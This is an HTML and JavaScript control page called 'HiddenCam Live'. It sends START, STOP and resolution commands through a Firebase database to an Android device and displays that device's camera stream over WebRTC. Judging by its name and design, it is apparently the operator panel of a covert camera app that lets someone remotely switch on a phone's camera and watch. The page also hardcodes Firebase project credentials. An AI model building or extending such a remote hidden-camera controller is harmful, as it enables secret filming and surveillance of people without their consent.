<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>HiddenCam - Live Stream</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }

        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 24px;
            max-width: 500px;
            width: 100%;
            border: 1px solid rgba(255,255,255,0.1);
        }

        h1 {
            text-align: center;
            color: white;
            font-size: 20px;
            margin-bottom: 20px;
            letter-spacing: 1px;
        }

        .status-card {
            background: rgba(0,0,0,0.5);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 20px;
            text-align: center;
        }

        .status-header {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }

        .dot-green {
            background: #00ff00;
            box-shadow: 0 0 10px #00ff00;
        }

        .dot-red {
            background: #ff0000;
            box-shadow: 0 0 10px #ff0000;
        }

        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.9); }
            100% { opacity: 1; transform: scale(1); }
        }

        .status-text {
            color: white;
            font-size: 16px;
            font-weight: 500;
        }

        .stream-id {
            color: #888;
            font-size: 11px;
            margin-top: 8px;
            word-break: break-all;
        }

        .video-container {
            background: #000;
            border-radius: 16px;
            overflow: hidden;
            margin-bottom: 20px;
            aspect-ratio: 16/9;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .placeholder {
            color: #555;
            text-align: center;
            font-size: 13px;
        }

        .controls {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
        }

        button {
            flex: 1;
            padding: 14px;
            font-size: 14px;
            font-weight: 600;
            border: none;
            border-radius: 40px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: inherit;
        }

        .btn-start {
            background: linear-gradient(135deg, #00b09b, #96c93d);
            color: white;
        }

        .btn-start:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0,176,155,0.4);
        }

        .btn-stop {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
        }

        .btn-stop:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(255,107,107,0.4);
        }

        .resolution-section {
            margin-bottom: 16px;
        }

        .resolution-title {
            color: white;
            font-size: 12px;
            margin-bottom: 10px;
            text-align: center;
        }

        .resolution-buttons {
            display: flex;
            gap: 12px;
        }

        .res-btn {
            flex: 1;
            padding: 10px;
            background: rgba(255,255,255,0.15);
            color: white;
            font-size: 13px;
        }

        .res-btn.active {
            background: linear-gradient(135deg, #667eea, #764ba2);
        }

        .info {
            text-align: center;
            color: #555;
            font-size: 10px;
            margin-top: 16px;
        }

        .debug {
            background: rgba(0,0,0,0.8);
            color: #0f0;
            font-size: 9px;
            padding: 10px;
            border-radius: 8px;
            margin-top: 16px;
            word-break: break-all;
            font-family: monospace;
            max-height: 150px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📹 HiddenCam Live</h1>

        <div class="status-card">
            <div class="status-header">
                <div class="dot dot-red" id="statusDot"></div>
                <div class="status-text" id="statusText">App Offline</div>
            </div>
            <div class="stream-id" id="streamIdText">Waiting for stream...</div>
        </div>

        <div class="video-container">
            <video id="video" autoplay playsinline muted></video>
            <div class="placeholder" id="placeholder">No live stream<br>Click START on Web</div>
        </div>

        <div class="controls">
            <button class="btn-start" id="startBtn">▶ START</button>
            <button class="btn-stop" id="stopBtn">⏹ STOP</button>
        </div>

        <div class="resolution-section">
            <div class="resolution-title">📺 Resolution</div>
            <div class="resolution-buttons">
                <button class="res-btn" id="res120p">120p (Low)</button>
                <button class="res-btn active" id="res240p">240p (Medium)</button>
            </div>
        </div>

        <div class="info">
            ⚡ WebRTC Real-time | 🟢 Online | 🔴 Offline
        </div>

        <div class="debug" id="debug">
            Initializing...
        </div>
    </div>

    <script>
        // ============================================
        // FIREBASE CONFIG - HIDDENCAM PROJECT
        // ============================================
        const firebaseConfig = {
            apiKey: "AIzaSyCcstwitNGxv5osXZ9AQ0a0PDn7j-MTv-0",
            authDomain: "hiddencam-62e2d.firebaseapp.com",
            databaseURL: "https://hiddencam-62e2d-default-rtdb.firebaseio.com",
            projectId: "hiddencam-62e2d",
            storageBucket: "hiddencam-62e2d.firebasestorage.app",
            messagingSenderId: "931792860891",
            appId: "1:931792860891:android:602d1099f876f4688d7efe"
        };
        // ============================================

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        const debugEl = document.getElementById('debug');
        function log(msg) {
            const time = new Date().toLocaleTimeString();
            debugEl.innerHTML += `<br>[${time}] ${msg}`;
            debugEl.scrollTop = debugEl.scrollHeight;
            console.log(msg);
        }

        let peerConnection = null;
        let currentStreamId = null;

        const configuration = {
            iceServers: [
                { urls: "stun:stun.l.google.com:19302" },
                { urls: "stun:stun1.l.google.com:19302" }
            ]
        };

        log('Firebase initialized');

        // Firebase connection check
        database.ref('.info/connected').on('value', (snap) => {
            log(`Firebase connection: ${snap.val() ? 'Connected ✅' : 'Disconnected ❌'}`);
        });

        // App Status Listener
        database.ref('appStatus/isOnline').on('value', (snapshot) => {
            const isOnline = snapshot.val();
            log(`App status: ${isOnline ? 'ONLINE 🟢' : 'OFFLINE 🔴'}`);
            
            if(isOnline) {
                document.getElementById('statusDot').className = 'dot dot-green';
                document.getElementById('statusText').innerHTML = '🟢 App Online';
            } else {
                document.getElementById('statusDot').className = 'dot dot-red';
                document.getElementById('statusText').innerHTML = '🔴 App Offline';
            }
        });

        // Stream ID Listener
        database.ref('appStatus/streamId').on('value', (snapshot) => {
            currentStreamId = snapshot.val();
            if(currentStreamId) {
                log(`Stream ID received: ${currentStreamId.substring(0, 8)}...`);
                document.getElementById('streamIdText').innerHTML = `Stream ID: ${currentStreamId.substring(0, 8)}...`;
                setupWebRTC();
            } else {
                log('Waiting for stream ID...');
                document.getElementById('streamIdText').innerHTML = 'Waiting for stream...';
            }
        });

        async function setupWebRTC() {
            if(!currentStreamId) {
                log('No stream ID, cannot setup WebRTC');
                return;
            }
            
            if(peerConnection) {
                log('Closing existing peer connection');
                peerConnection.close();
                peerConnection = null;
            }

            log('Creating PeerConnection...');
            peerConnection = new RTCPeerConnection(configuration);

            peerConnection.ontrack = (event) => {
                log('✅✅✅ VIDEO TRACK RECEIVED! Stream is LIVE! ✅✅✅');
                const video = document.getElementById('video');
                video.srcObject = event.streams[0];
                document.getElementById('placeholder').style.display = 'none';
            };

            peerConnection.onicecandidate = (event) => {
                if(event.candidate) {
                    log(`ICE candidate sent to Android`);
                    database.ref(`webrtc/${currentStreamId}/candidates/web`).push(event.candidate);
                }
            };

            peerConnection.onconnectionstatechange = () => {
                log(`Connection state: ${peerConnection.connectionState}`);
                if(peerConnection.connectionState === 'connected') {
                    log('🎉🎉🎉 CONNECTED! Video should be visible! 🎉🎉🎉');
                } else if(peerConnection.connectionState === 'failed') {
                    log('❌ Connection failed! Check network');
                }
            };

            try {
                log('Waiting for offer from Android...');
                const offerRef = database.ref(`webrtc/${currentStreamId}/offer`);
                const offerSnap = await offerRef.get();
                const offer = offerSnap.val();
                
                if(offer && offer.sdp) {
                    log(`Offer received! Setting remote description...`);
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
                    log('Remote description set, creating answer...');
                    const answer = await peerConnection.createAnswer();
                    await peerConnection.setLocalDescription(answer);
                    
                    log('Sending answer to Android...');
                    await database.ref(`webrtc/${currentStreamId}/answer`).set({
                        sdp: answer.sdp,
                        type: answer.type
                    });
                    log('✅ Answer sent successfully!');
                } else {
                    log('⚠️ No offer found in Firebase! Make sure Android app has START pressed.');
                }

                // Listen for ICE candidates from Android
                database.ref(`webrtc/${currentStreamId}/candidates`).on('child_added', (snap) => {
                    const candidate = snap.val();
                    if(candidate && candidate.sdp && peerConnection) {
                        log(`ICE candidate received from Android`);
                        peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => log(`ICE error: ${e}`));
                    }
                });

            } catch(error) {
                log(`❌ ERROR: ${error.message}`);
                console.error(error);
            }
        }

        // START Button
        document.getElementById('startBtn').onclick = () => {
            log('▶ START command sent to Android');
            database.ref('commands/stream').set('START');
        };

        // STOP Button
        document.getElementById('stopBtn').onclick = () => {
            log('⏹ STOP command sent to Android');
            database.ref('commands/stream').set('STOP');
            if(peerConnection) {
                peerConnection.close();
                peerConnection = null;
                const video = document.getElementById('video');
                video.srcObject = null;
                document.getElementById('placeholder').style.display = 'flex';
                log('Peer connection closed');
            }
        };

        // 120p Resolution
        document.getElementById('res120p').onclick = () => {
            log('Resolution changed to 120p');
            database.ref('commands/resolution').set('120p');
            document.getElementById('res120p').classList.add('active');
            document.getElementById('res240p').classList.remove('active');
        };

        // 240p Resolution
        document.getElementById('res240p').onclick = () => {
            log('Resolution changed to 240p');
            database.ref('commands/resolution').set('240p');
            document.getElementById('res240p').classList.add('active');
            document.getElementById('res120p').classList.remove('active');
        };

        log('✅ Web app loaded. Waiting for Android app to connect...');
    </script>
</body>
</html>
